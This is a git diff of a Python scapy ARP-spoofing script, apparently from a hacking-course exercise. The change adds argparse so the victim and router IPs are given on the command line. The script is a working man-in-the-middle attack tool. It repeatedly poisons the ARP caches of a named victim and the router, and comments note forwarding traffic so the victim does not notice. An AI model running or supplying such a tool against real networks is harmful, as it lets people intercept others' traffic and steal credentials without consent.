@@ -1,6 +1,23 @@
 #!usr/bin/python3
 import scapy.all as scapy
+import argparse
 import time
+
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-T', '--target', dest='victim_ip',
+                        help='IP of the target machine')
+    parser.add_argument('-R', '--router', dest='router_ip',
+                        help='IP of the router')
+    options = parser.parse_args()
+    if not options.victim_ip:
+        parser.error(
+            '[-] Please specify target IP, use --help for more info.')
+    elif not options.router_ip:
+        parser.error(
+            '[-] Please specify Router IP, use --help for more info.')
+    return options
 
 
 def get_mac(ip):
@@ -43,8 +60,9 @@ def restore(dest_ip, src_ip):
     # send the packet to spoof the victim
     scapy.send(packet, count=4, verbose=False)
 
-victim_ip ='192.168.28.41'
-router_ip ='192.168.28.33'
+
+# getting arguments in input from user
+options = get_arguments()
 
 # maintain the spoof as long as I want ^C to interrupt
 # but we need to forward ports to give internet to the victim machine
@@ -52,11 +70,13 @@ router_ip ='192.168.28.33'
 sent_packet_count = 0
 try:
     while True:
-        spoof(victim_ip, router_ip)
-        spoof(router_ip, victim_ip)
+        spoof(options.victim_ip, options.router_ip)
+        spoof(options.router_ip, options.victim_ip)
+        # spoof(victim_ip, router_ip)
+        # spoof(router_ip, victim_ip)
         sent_packet_count = sent_packet_count + 2
         print('\r[+] Packets sent ' + str(sent_packet_count), end='')
         time.sleep(2)
 except KeyboardInterrupt:
-    restore(victim_ip, router_ip)
+    restore(options.victim_ip, options.router_ip)
     print('\n[+] Detected CTRL + C ... Quitting and Restore ARP table.')
